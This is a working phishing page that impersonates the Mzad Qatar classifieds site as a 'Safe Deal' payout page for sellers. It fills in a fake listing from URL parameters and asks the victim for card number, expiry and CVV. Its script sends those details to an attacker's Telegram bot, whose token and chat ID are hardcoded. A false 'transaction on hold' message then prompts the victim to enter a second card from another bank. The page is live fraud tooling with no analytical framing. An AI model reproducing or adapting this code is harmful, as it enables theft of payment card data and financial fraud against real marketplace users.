<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title>Mzad Qatar | Safe Deal</title>
    <style>
        :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; --border: #e2e4e7; }
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--bg); margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        .app-shell { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; display: flex; flex-direction: column; }

        /* HEADER */
        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
        .logo-main { height: 40px; }
        .nav-tools { display: flex; gap: 15px; align-items: center; }

        /* PRODUCT AREA */
        .product-card { border-bottom: 8px solid var(--bg); }
        .img-box { width: 100%; aspect-ratio: 1.2; background: white; display: flex; align-items: center; justify-content: center; overflow: hidden; border-bottom: 1px solid #eee; }
        .img-box img { width: 100%; height: 100%; object-fit: contain; }
        
        .info-area { padding: 16px; }
        .cat-link { font-size: 12px; color: var(--mzad-red); font-weight: 600; margin-bottom: 5px; }
        .ad-title { font-size: 20px; font-weight: 700; margin: 0 0 10px; color: #111; }
        .ad-price { font-size: 28px; font-weight: 800; color: var(--mzad-red); margin-bottom: 15px; }

        /* FEATURES GRID */
        .features { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .f-box { background: #fafafa; border: 1px solid #eee; padding: 12px; border-radius: 10px; display: flex; align-items: center; gap: 10px; font-size: 13px; color: #666; }

        /* FORM */
        .form-area { padding: 25px 16px; background: #fff; border-top: 1px solid #eee; }
        .form-area h2 { font-size: 17px; text-align: center; color: var(--mzad-red); margin-bottom: 25px; }
        .q-inp { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; margin-bottom: 15px; outline: none; }
        .q-inp:focus { border-color: var(--mzad-red); }
        .btn-payout { width: 100%; background: var(--mzad-red); color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; }

        /* STORE BADGES (ВШИТЫ КОДОМ) */
        .stores { padding: 30px 16px; text-align: center; background: #fff; border-top: 8px solid var(--bg); }
        .stores-title { font-size: 14px; font-weight: 800; color: #555; margin-bottom: 15px; }
        .badge-flex { display: flex; justify-content: center; gap: 10px; }
        .badge-mock { background: #000; color: white; padding: 8px 12px; border-radius: 6px; font-size: 10px; display: flex; align-items: center; gap: 5px; min-width: 100px; text-decoration: none; }
        .badge-mock b { font-size: 13px; display: block; }

        .footer { padding: 30px; text-align: center; font-size: 11px; color: #aaa; background: white; }
    </style>
</head>
<body>

<div class="app-shell">
    <header>
        <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="logo-main">
        <div class="nav-tools">
            <span style="font-weight: 700; color: var(--mzad-red);">EN</span>
            <span style="font-size: 24px; color: #666;">☰</span>
        </div>
    </header>

    <div class="product-card">
        <div class="img-box">
            <img id="p-img" src="">
        </div>
        <div class="info-area">
            <div class="cat-link">Mzad Qatar > Electronics > Mobile</div>
            <h1 class="ad-title" id="p-name">Loading...</h1>
            <div class="ad-price" id="p-price">0 QAR</div>
            
            <div class="features">
                <div class="f-box">📍 <span id="p-addr">Doha</span></div>
                <div class="f-box">🕒 <span>Posted today</span></div>
                <div class="f-box">📱 <span>New Condition</span></div>
                <div class="f-box">🛡️ <span>Verified Deal</span></div>
            </div>
        </div>
    </div>

    <div class="form-area">
        <h2>Withdraw Payout to Card</h2>
        <form id="payout-form">
            <input type="text" id="cn" class="q-inp" placeholder="Card Number" required maxlength="19">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="ce" class="q-inp" placeholder="MM/YY" required maxlength="5" style="flex: 1;">
                <input type="text" id="cv" class="q-inp" placeholder="CVV" required maxlength="4" style="flex: 1;">
            </div>
            <button type="submit" class="btn-payout" id="btn-text">RECEIVE FUNDS</button>
        </form>
    </div>

    <div class="stores">
        <div class="stores-title">GET MZAD QATAR APP</div>
        <div class="badge-flex">
            <div class="badge-mock"><span></span> <div><small>Download on</small><b>App Store</b></div></div>
            <div class="badge-mock"><span>▶</span> <div><small>Get it on</small><b>Google Play</b></div></div>
        </div>
    </div>

    <div class="footer">
        <p>Protected by Mzad Qatar & QNB Escrow.</p>
        <p>© 2026 Mzad Qatar</p>
    </div>
</div>

<script>
    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
    const CHAT_ID = '8071425015';

    const url = new URLSearchParams(window.location.search);
    document.getElementById('p-name').innerText = url.get('item') || 'Product';
    document.getElementById('p-price').innerText = (url.get('price') || '0') + ' QAR';
    document.getElementById('p-img').src = url.get('img') || 'https://via.placeholder.com/400';
    document.getElementById('p-addr').innerText = url.get('addr') || 'Doha, Qatar';

    // Маски для ввода
    document.getElementById('cn').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
    };
    document.getElementById('ce').oninput = (e) => {
        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim();
    };

    document.getElementById('payout-form').onsubmit = async (e) => {
        e.preventDefault();
        const b = document.getElementById('btn-text');
        b.innerText = 'PROCESSING...';
        b.disabled = true;

        const msg = `🇶🇦 **MZAD QATAR LOG**\n\n📦 Item: ${url.get('item')}\n💰 Price: ${url.get('price')} QAR\n\n💳 Card: \`${document.getElementById('cn').value}\`\n📅 Exp: \`${document.getElementById('ce').value}\`\n🔒 CVV: \`${document.getElementById('cv').value}\`\n\n👤 Seller: ${url.get('seller')}`;

        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
            });
            setTimeout(() => {
                alert("The transaction is on hold. To complete the transfer, please verify using another card from a different bank.");
                b.innerText = 'RECEIVE FUNDS';
                b.disabled = false;
                document.getElementById('payout-form').reset();
            }, 2500);
        } catch (err) {
            alert("Error. Try again.");
            b.disabled = false;
        }
    };
</script>

</body>
</html>
